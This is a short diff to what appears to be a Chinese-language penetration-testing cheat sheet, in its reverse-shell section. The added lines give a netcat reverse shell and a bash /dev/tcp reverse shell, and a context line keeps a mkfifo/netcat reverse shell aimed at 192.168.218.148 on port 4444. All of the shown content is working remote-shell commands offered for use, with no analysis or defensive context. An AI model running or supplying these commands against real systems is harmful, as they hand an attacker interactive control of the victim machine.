@@ -52,7 +52,10 @@
 
 
 ## 反向shell
-`bash -i >& /dev/tcp/$ip/$port 0>&1`
+Netcat
+`nc $IP $PORT -e /bin/bash`
+bash
+`/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'`
 不支持/dev/tcp
 `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.218.148 4444 > /tmp/f`
 
